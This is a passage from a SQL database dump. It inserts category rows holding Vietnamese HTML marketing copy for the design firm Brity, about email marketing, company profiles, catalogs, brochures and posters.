(71, 'App Icon', 'App Icon', 'app-icon', 'app-icon', '', NULL, NULL, 1, 0, 57, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 16, '2018-05-30 04:58:02', '', '2018-05-29 21:58:02'),
(72, 'Email Marketing', 'Email Marketing', 'email-marketing', 'email-marketing', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ứng dụng phần mềm Email Marketing l&agrave; một trong những ứng dụng cần thiết cho bất cứ doanh nghiệp n&agrave;o muốn thiết kế những chiến dịch quảng c&aacute;o của m&igrave;nh, theo đ&oacute; một mẫu Email Marketing được thiết kế chuy&ecirc;n nghiệp, chỉn chu lu&ocirc;n dễ d&agrave;ng truyền tải được mọi th&ocirc;ng điệp, nội dung của c&aacute;c chiến dịch marketing tới kh&aacute;ch h&agrave;ng dễ d&agrave;ng, chuy&ecirc;n nghiệp v&agrave; tối ưu hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đ&acirc;y cũng l&agrave; l&yacute; do việc thiết kế Email Marketing đang ng&agrave;y c&agrave;ng trở th&agrave;nh nhu cầu bức thiết của hầu hết c&aacute;c doanh nghiệp. Dưới đ&acirc;y l&agrave; một ch&uacute; &yacute;&nbsp; khi thiết kế Email Marketing m&agrave; Brity chia sẻ v&agrave; tư vấn tới bạn đọc.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/18_2.jpg\" alt=\"\" width=\"1920\" height=\"600\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Chỉnh chu ngay từ d&ograve;ng ti&ecirc;u đề đầu ti&ecirc;n</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Một trong những y&ecirc;u cầu thiết kế Email Marketing của Brity cho doanh nghiệp l&agrave; những d&ograve;ng ti&ecirc;u đề đầu ti&ecirc;n đều cần ch&uacute; &yacute; chỉn chu v&agrave; cẩn thận, đ&acirc;y ch&iacute;nh l&agrave; d&ograve;ng chũ nhỏ đầu ti&ecirc;n m&agrave; khi người đọc mở một Email ra c&oacute; thể đọc được.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&oacute; thể n&oacute;i rằng d&ograve;ng ti&ecirc;u đề đầu ti&ecirc;n c&ograve;n được đ&aacute;nh gi&aacute; l&agrave; d&ograve;ng chữ tạo niềm tin để tạo ấn tượng mạnh cho kh&aacute;ch h&agrave;ng, mang lại hiệu quả cao nhất cho Email Marketing.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tại Email Marketing d&ograve;ng ti&ecirc;u đề&nbsp; đầu ti&ecirc;n bao giờ cũng đi k&egrave;m với banner được thiết kế nhỏ gọn v&agrave; dung lượng vừa phải, đảm bảo kh&aacute;ch h&agrave;ng dễ d&agrave;ng tiếp nhận nội dung Email Marketing tốt hơn hẳn.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Cẩn trọng tỉ mỉ trong ch&egrave;n logo trong Email Marketing</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tất nhi&ecirc;n khi thiết kế Email Marketing ch&uacute;ng ta cần cẩn trọng trong việc ch&egrave;n logo trong Email, mặc d&ugrave; logo ch&iacute;nh l&agrave; dấu hiệu để kh&aacute;ch h&agrave;ng dễ d&agrave;ng nhận diện thương hiệu của bạn, hay n&oacute;i rằng logo ch&iacute;nh l&agrave; yếu tố quyết định để kh&aacute;ch h&agrave;ng c&oacute; tiếp tục đọc email của bạn hay kh&ocirc;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; thế khi thiết kế Email Marketing th&igrave; logo n&ecirc;n đặt ngay đầu Email, đảm bảo cho người xem c&oacute; thể nh&igrave;n thấy dễ d&agrave;ng hơn, tuy nhi&ecirc;n phải đảm bảo logo đặt ở đầu b&ecirc;n tr&aacute;i email, dung lượng nhỏ để kh&aacute;ch h&agrave;ng dễ nhận biết v&agrave; đảm bảo tải load Email Marketing nhanh ch&oacute;ng.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p>&nbsp;<img src=\"http://brity.vn/upload/19_1.jpg\" alt=\"\" width=\"1280\" height=\"549\" /></p>\r\n<p>&nbsp;</p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3. Thiết kế h&igrave;nh nền bắt mắt</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Thiết kế h&igrave;nh nền bắt mắt cũng l&agrave; y&ecirc;u cầu cần thiết trong thiết kế Email Marketing, trong đ&oacute; ở Brity lu&ocirc;n đảm bảo thiết kế h&igrave;nh nền tinh tế, đảm bảo được t&iacute;nh chuẩn mực của mẫu Email, đảm bảo m&agrave;u nền th&iacute;ch hợp nhất.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">4. Tuyệt đối kh&ocirc;ng d&ugrave;ng c&aacute;c từ ngữ được xem l&agrave; spam</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tất nhi&ecirc;n những từ ngữ được xem l&agrave; spam ch&iacute;nh l&agrave; những từ ngữ tuyệt đối kh&ocirc;ng được Brity sử dụng khi thiết kế Email Marketing, điều n&agrave;y&nbsp; sẽ tr&aacute;nh việc email của bạn bị kh&aacute;ch h&agrave;ng đưa v&agrave;o th&ugrave;ng r&aacute;c hoặc&nbsp; h&ograve;m thư spam khi kh&aacute;ch h&agrave;ng nhận được.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Những điều tr&ecirc;n đ&acirc;y sẽ gi&uacute;p email của bạn được gửi ho&agrave;n thiện tới người nhận, tăng cường cơ hội truyền tải được th&ocirc;ng điệp của m&igrave;nh tới nhiều kh&aacute;ch h&agrave;ng hơn.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><img src=\"http://brity.vn/upload/20.jpg\" alt=\"\" width=\"1280\" height=\"2160\" /></p>', NULL, 1, 0, 57, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 17, '2018-07-12 10:17:36', '', '2018-07-12 03:17:36'),
(73, 'Hồ sơ năng lực doanh nghiệp', 'Profile Company', 'ho-so-nang-luc-doanh-nghiep', 'profile-company', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Hồ sơ năng lực doanh nghiệp l&agrave; t&agrave;i liệu quan trọng v&agrave; cấp thiết m&agrave; bất cứ doanh nghiệp n&agrave;o cũng đều cần, đặc biệt đ&acirc;y ch&iacute;nh l&agrave; t&agrave;i sản kh&ocirc;ng thể thiếu của doanh nghiệp, vừa l&agrave; c&ocirc;ng cụ thể hiện năng lực doanh nghiệp, vừa l&agrave; người b&aacute;n h&agrave;ng trực tuyến cho doanh nghiệp của bạn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; vậy n&ecirc;n việc t&igrave;m kiếm những đơn vị uy t&iacute;n như Brity để thiết kế hồ sơ năng lực c&ocirc;ng ty l&agrave; hết sức cần thiết, gi&uacute;p thể hiện r&otilde; lịch sử h&igrave;nh th&agrave;nh ph&aacute;t triển, năng lực cạnh tranh, thế mạnh, nguồn nh&acirc;n lực&hellip;&nbsp; của doanh nghiệp bạn một c&aacute;ch r&otilde; r&agrave;ng nhất.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. L&yacute; do kh&aacute;ch h&agrave;ng cần thiết kế hồ sơ năng lực c&ocirc;ng ty</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Mỗi c&ocirc;ng ty đều cần phải c&oacute; một cuốn hồ sơ năng lực, trong đ&oacute; thể hiện mọi th&ocirc;ng tin m&agrave; doanh nghiệp của bạn muốn quảng b&aacute; ra thị trường.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Trong đ&oacute; hồ sơ năng lực doanh nghiệp cần đảm bảo sinh động, s&uacute;c t&iacute;ch để kh&aacute;ch h&agrave;ng khi theo d&otilde;i c&oacute; thể nắm r&otilde; được mọi th&ocirc;ng tin, hoạt động của doanh nghiệp một c&aacute;ch nhanh ch&oacute;ng nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Một cuốn hồ sơ năng lực doanh nghiệp ho&agrave;n chỉnh sẽ gi&uacute;p thu h&uacute;t kh&aacute;ch h&agrave;ng tiềm năng, từ đ&oacute; kh&aacute;ch h&agrave;ng c&oacute; thể đưa ra được c&aacute;i nh&igrave;n tổng quan về c&ocirc;ng ty của bạn, so s&aacute;nh được với c&aacute;c c&ocirc;ng ty c&ugrave;ng lĩnh vực, lựa chọn dịch vụ của đơn vị n&agrave;o một c&aacute;ch nhanh ch&oacute;ng, c&oacute; thể n&oacute;i đ&acirc;y ch&iacute;nh l&agrave; vũ kh&iacute; quan trọng gi&uacute;p doanh nghiệp của bạn tăng cường t&iacute;nh cạnh tranh tr&ecirc;n thị trường v&agrave; t&igrave;m kiếm kh&aacute;ch h&agrave;ng tiềm năng.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Thiết kế hồ sơ năng lực tại Brity</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Nếu doanh nghiệp bạn đang t&igrave;m kiếm đơn vị thiết kế hồ sơ năng lực uy t&iacute;n v&agrave; hiệu quả th&igrave; Brity ch&iacute;nh l&agrave; điểm đến h&agrave;ng đầu được nhiều doanh nghiệp lựa chọn hiện nay.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Dịch vụ thiết kế hồ sơ năng lực tại Brity lu&ocirc;n đảm bảo nội dung, dữ liệu được ghi v&agrave;o trong profile ch&iacute;nh x&aacute;c, logic, tr&igrave;nh b&agrave;y phong ph&uacute;, r&otilde; r&agrave;ng, thể hiện r&otilde; được thế mạnh của doanh nghiệp, lĩnh vực hoạt động của doanh nghiệp v&agrave; lợi &iacute;ch m&agrave; kh&aacute;ch h&agrave;ng c&oacute; thể nhận được khi sử dụng dịch vụ của doanh nghiệp bạn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">To&agrave;n bộ nội dung trong profile đều được tr&igrave;nh b&agrave;y &iacute;t từ, đủ &yacute;, ngắn gọn nhưng dễ hiểu, nhấn mạnh được c&aacute;c thế mạnh của doanh nghiệp, thiết kế l&agrave;m nổi bật những yếu tố thu h&uacute;t kh&aacute;ch h&agrave;ng, đảm bảo mang lại cho doanh nghiệp một cuốn hồ sơ năng lực tinh tế, đẹp mắt, đảm bảo hấp dẫn v&agrave; thu h&uacute;t người xem, từ đ&oacute; tăng cường ảnh hưởng tới người d&ugrave;ng v&agrave; thu h&uacute;t người d&ugrave;ng sử dụng dịch vụ, sản phẩm của bạn.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/21.jpg\" alt=\"\" width=\"1400\" height=\"934\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/22.jpg\" alt=\"\" width=\"1400\" height=\"934\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/23.jpg\" alt=\"\" width=\"1400\" height=\"934\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/25.jpg\" alt=\"\" width=\"1400\" height=\"934\" /></span></p>', NULL, 1, 0, 58, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 18, '2018-07-12 10:30:13', '', '2018-07-12 03:30:13'),
(74, 'Catalog sản phẩm/dịch vụ', 'Catalog', 'catalog-san-phamdich-vu', 'catalog', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">L&agrave; đơn vị chuy&ecirc;n thiết kế Catalog sản phẩm/dịch vụ chuy&ecirc;n nghiệp, Brity lu&ocirc;n cam kết mang lại gi&aacute; trị sử dụng dịch vụ cao nhất cho kh&aacute;ch h&agrave;ng, cung cấp c&aacute;c dịch vụ thiết kế Catalog sản phẩm/dịch vụ nhanh ch&oacute;ng, chuy&ecirc;n nghiệp với gi&aacute; cả cạnh tranh..</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Thế n&agrave;o l&agrave; thiết kế Catalog sản phẩm/dịch vụ ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tr&ecirc;n thực tế Catalog sản phẩm/dịch vụ ch&iacute;nh l&agrave; những ấn phẩm tự giới thiệu về sản phẩm, dịch vụ của mỗi doanh nghiệp, được c&aacute;c chuy&ecirc;n gia thiết kế với nhiều k&iacute;ch thước c&ugrave;ng số trang kh&aacute;c nhau, b&ecirc;n trong truyền tải to&agrave;n bộ h&igrave;nh ảnh, nội dung của sản phẩm, dịch vụ tới kh&aacute;ch h&agrave;ng một c&aacute;ch ch&iacute;nh x&aacute;c v&agrave; ho&agrave;n hảo.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Bất cứ doanh nghiệp n&agrave;o cũng đều cần ch&uacute; &yacute; tập trung thiết kế Catalog sản phẩm/dịch vụ, bởi đ&acirc;y ch&iacute;nh l&agrave; c&ocirc;ng cụ b&aacute;n h&agrave;ng ho&agrave;n hảo nhất c&oacute; thể xuất hiện mọi l&uacute;c khi kh&aacute;ch h&agrave;ng cần.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&oacute; thể n&oacute;i Catalog sản phẩm/dịch vụ ch&iacute;nh l&agrave; trợ thủ đắc lực của doanh nghiệp, dễ d&agrave;ng giải th&iacute;ch với kh&aacute;ch h&agrave;ng về gi&aacute; trị, th&agrave;nh phần của sản phẩm, dịch vụ m&agrave; doanh nghiệp bạn đang hoạt động.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Một bản Catalog sản phẩm/dịch vụ ho&agrave;n hảo c&oacute; thể gi&uacute;p tăng cường tương t&aacute;c giữa thương hiệu với kh&aacute;ch h&agrave;ng, từ đ&oacute; gia rang doanh số , mang tới cho thương hiệu của bạn sự ấn tượng mạnh mẽ trong mắt kh&aacute;ch h&agrave;ng.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. L&yacute; do n&agrave;o bạn n&ecirc;n thiết kế Catalog sản phẩm/dịch vụ tại Brity</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&oacute; thể n&oacute;i Brity ch&iacute;nh l&agrave; đơn vị h&agrave;ng đầu trong thiết kế Catalog sản phẩm/dịch vụ d&agrave;nh cho đ&ocirc;ng đảo kh&aacute;ch h&agrave;ng, nhận được sự tin cậy của h&agrave;ng loạt kh&aacute;ch h&agrave;ng sau khi sử dụng dịch vụ thiết kế tại đ&acirc;y.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tại Brity đ&atilde; thực hiện qua nhiều dự &aacute;n lớn cho kh&aacute;ch h&agrave;ng, sở hữu đội ngũ Designer chuy&ecirc;n nghiệp, s&aacute;ng tạo v&agrave; nhiệt huyết tham gia v&agrave;o dự &aacute;n của bạn, lu&ocirc;n đảm bảo t&iacute;nh s&aacute;ng tạo v&agrave; ấn tượng nhất cho Catalog sản phẩm/dịch vụ của doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với những kh&aacute;ch h&agrave;ng sử dụng dịch vụ thiết kế Catalog sản phẩm/dịch vụ tại Brity ho&agrave;n to&agrave;n c&oacute; thể y&ecirc;n t&acirc;m về tiến độ dự &aacute;n được cam kết, mang tới cho doanh nghiệp một cuốn Catalog sản phẩm/dịch vụ s&aacute;ng tạo, đẹp mắt, truyền tải đầy đủ th&ocirc;ng tin tốt nhất của doanh nghiệp, gi&uacute;p tăng cường nhận diện thương hiệu cho doanh nghiệp ho&agrave;n hảo.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Dịch vụ chỉ được ho&agrave;n th&agrave;nh khi kh&aacute;ch h&agrave;ng ưng &yacute; nhất về cuốn Profile của m&igrave;nh.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/03_1.jpg\" alt=\"\" width=\"2048\" height=\"1365\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/02.jpg\" alt=\"\" width=\"1000\" height=\"667\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/01.jpg\" alt=\"\" width=\"1300\" height=\"750\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;<img src=\"http://brity.vn/upload/05_1.jpg\" alt=\"\" width=\"2500\" height=\"1674\" /></span></p>', NULL, 1, 0, 58, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 19, '2018-07-12 15:42:31', '', '2018-07-12 08:42:31'),
(75, 'Brochure sản phẩm/dịch vụ', 'Brochure', 'brochure-san-phamdich-vu', 'brochure', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&oacute; thể n&oacute;i những bản thiết kế Brochure sản phẩm/dịch vụ ch&iacute;nh l&agrave; chiếc cầu nối của mỗi doanh nghiệp, gi&uacute;p doanh nghiệp dễ d&agrave;ng truyền tải được th&ocirc;ng tin sản phẩm, th&ocirc;ng điệp c&ugrave;ng dịch vụ của m&igrave;nh tới tay những kh&aacute;ch h&agrave;ng mục ti&ecirc;u.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đ&acirc;y cũng l&agrave; l&yacute; do khi thiết kế Brochure sản phẩm/dịch vụ doanh nghiệp n&ecirc;n t&igrave;m chọn những đơn vị uy t&iacute;n, chuy&ecirc;n nghiệp để sở hữu những ấn phẩm quảng c&aacute;o ho&agrave;n hảo nhất.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/04.jpg\" alt=\"\" width=\"1160\" height=\"772\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Thế n&agrave;o l&agrave; thiết kế Brochure sản phẩm/dịch vụ ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tr&ecirc;n thực tế Brochure sản phẩm/dịch vụ ch&iacute;nh l&agrave; một dạng ấn phẩm quảng c&aacute;o về sản phẩm, dịch vụ, b&ecirc;n trong đ&oacute; c&oacute; đầy đủ th&ocirc;ng tin giới thiệu về sản phẩm, dịch vụ, văn h&oacute;a &hellip;. Của doanh nghiệp, gửi gắm tới người xem l&agrave; kh&aacute;ch h&agrave;ng để kh&aacute;ch h&agrave;ng nắm r&otilde; hơn về sản phẩm, dịch vụ của doanh nghiệp đ&oacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">N&oacute;i kh&ocirc;ng sai khi cho rằng Brochure sản phẩm/dịch vụ ch&iacute;nh l&agrave; bộ mặt của doanh nghiệp, ch&iacute;nh v&igrave; vậy khi thiết kế&nbsp; Brochure sản phẩm/dịch vụ lu&ocirc;n cần phải đảm bảo t&iacute;nh s&aacute;ng tạo, đẹp mắt để tạo ấn tượng đẹp cho doanh nghiệp trong mắt người ti&ecirc;u d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với những ấn phẩm Brochure sản phẩm/dịch vụ ho&agrave;n hảo c&oacute; thể truyền tải đầy đủ h&igrave;nh ảnh, th&ocirc;ng tin về sản phẩm, dịch vụ của doanh nghiệp tới tay người ti&ecirc;u d&ugrave;ng, l&agrave; người cung cấp v&agrave; truyền tải th&ocirc;ng tin thay cho doanh nghiệp, được xem l&agrave; một c&ocirc;ng cụ quảng c&aacute;o hiệu quả chứa đựng những th&ocirc;ng tin c&ocirc; đọng v&agrave; r&otilde; r&agrave;ng nhất về ch&iacute;nh sản phẩm, dịch vụ đ&oacute;.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. L&yacute; do n&agrave;o kh&aacute;ch h&agrave;ng n&ecirc;n thiết kế Brochure sản phẩm/dịch vụ tại Brity</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Nếu bạn đang t&igrave;m kiếm đơn vị thiết kế Brochure sản phẩm/dịch vụ chuy&ecirc;n nghiệp th&igrave; Brity ch&iacute;nh l&agrave; sự lựa chọn ho&agrave;n hảo cho kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tại Brity sở hữu đội ngũ thiết kế chuy&ecirc;n nghiệp v&agrave; s&aacute;ng tạo, đảm bảo cung cấp cho kh&aacute;ch h&agrave;ng những ấn phẩm Brochure sản phẩm/dịch vụ thu h&uacute;t người d&ugrave;ng ngay từ c&aacute;i nh&igrave;n đầu ti&ecirc;n, tạo ấn tượng mạnh với người d&ugrave;ng nhờ thiết kế đẹp mắt, h&igrave;nh ảnh sinh động v&agrave; bố cục tr&igrave;nh b&agrave;y khoa học.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Những ấn phẩm Brochure sản phẩm/dịch vụ do Brity thiết kế lu&ocirc;n đảm bảo t&iacute;nh s&aacute;ng tạo cao vượt ra khỏi những quy chuẩn ban đầu, mang theo phong c&aacute;ch ri&ecirc;ng v&agrave; ho&agrave;n to&agrave;n kh&ocirc;ng nhầm lẫn với những bản thiết kế kh&aacute;ch, cam kết nội dung ngắn gọn, r&otilde; r&agrave;ng v&agrave; đầy đủ, c&oacute; c&aacute;ch tr&igrave;nh b&agrave;y thuyết phục nhất.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><img src=\"http://brity.vn/upload/07_1.jpg\" alt=\"\" width=\"1600\" height=\"900\" /></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><img src=\"http://brity.vn/upload/06_1.jpg\" alt=\"\" width=\"1200\" height=\"762\" /></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><img src=\"http://brity.vn/upload/10_1.jpg\" alt=\"\" width=\"2133\" height=\"1200\" /></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><img src=\"http://brity.vn/upload/11_5.jpg\" alt=\"\" width=\"1400\" height=\"933\" /></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>', NULL, 1, 0, 58, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 20, '2018-07-12 15:54:52', '', '2018-07-12 08:54:52');
INSERT INTO `news_categories` (`id`, `name`, `name_en`, `alias`, `alias_en`, `photo`, `mota`, `mota_en`, `status`, `lever`, `parent_id`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `com`, `stt`, `created_at`, `background`, `updated_at`) VALUES
(76, 'Poster', 'Flyer, Leaflet', 'poster', 'flyer-leaflet', '', '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Thiết kế Poster l&agrave; một trong những h&igrave;nh thức x&acirc;y dựng h&igrave;nh ảnh thương hiệu của doanh nghiệp v&agrave; đưa h&igrave;nh ảnh doanh nghiệp tới gần người d&ugrave;ng hơn, được hầu hết c&aacute;c c&ocirc;ng ty sử dụng để tăng cường nhận diện thương hiệu v&agrave; b&aacute;n h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; tầm quan trọng của Poster n&ecirc;n khi thiết kế Poster tốt nhất kh&aacute;ch h&agrave;ng n&ecirc;n t&igrave;m tới những đơn vị uy t&iacute;n, chuy&ecirc;n nghiệp như Brity để được tư vấn v&agrave; giải đ&aacute;p kịp thời.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Tầm quan trọng của thiết kế Poster với doanh nghiệp</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tr&ecirc;n thực tế Poster ch&iacute;nh l&agrave; những thiết kế khổ lớn, trong đ&oacute; c&oacute; nội dung v&agrave; h&igrave;nh ảnh mang t&iacute;nh chất quảng c&aacute;o, gắn liền với quảng b&aacute; dịch vụ, sản phẩm, thương hiệu của doanh nghiệp tới tay người ti&ecirc;u d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&oacute; thể n&oacute;i Poster ch&iacute;nh l&agrave; phương tiện quảng b&aacute; giới thiệu sản phẩm, dịch vụ của mỗi doanh nghiệp tới tay kh&aacute;ch h&agrave;ng một c&aacute;ch tiện lợi, nhanh ch&oacute;ng v&agrave; hiệu quả nhất, tiết kiệm nhất hiện nay.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/12_4.jpg\" alt=\"\" width=\"1696\" height=\"2400\" /></span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Y&ecirc;u cầu với Poster quảng c&aacute;o</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với mỗi Poster quảng c&aacute;o khi sử dụng lu&ocirc;n cần đảm bảo những y&ecirc;u cầu tối thiểu, trong đ&oacute; bao gồm h&igrave;nh ảnh sản phẩm phải sắc n&eacute;t v&agrave; r&otilde; r&agrave;ng, đảm bảo t&iacute;nh thẩm mỹ cao.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ri&ecirc;ng phần lớp th&ocirc;ng tin sản phẩm cũng phải dễ hiểu, kh&uacute;c triết v&agrave; r&otilde; r&agrave;ng, được thể hiện dưới h&igrave;nh thức độc đ&aacute;o theo đ&uacute;ng c&aacute; t&iacute;nh sản phẩm, thể hiện &yacute; đồ của nh&agrave; sản xuất.</span></p>\r\n<p style=\"text-align: justify;\"><span 